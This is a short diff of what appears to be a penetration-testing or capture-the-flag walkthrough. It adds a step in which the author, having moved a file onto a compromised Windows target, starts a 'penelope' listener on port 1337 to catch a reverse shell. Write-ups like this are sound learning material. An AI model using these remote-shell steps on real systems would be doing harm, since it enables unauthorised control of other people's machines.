@@ -550,5 +550,12 @@ PS C:\Users\web_account\Documents>
 I have now transferred it to the target!
 
 ```python
+penelope -p 1337                                        
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+Now ill start another listener on my machine
+
+```python
 
 ```
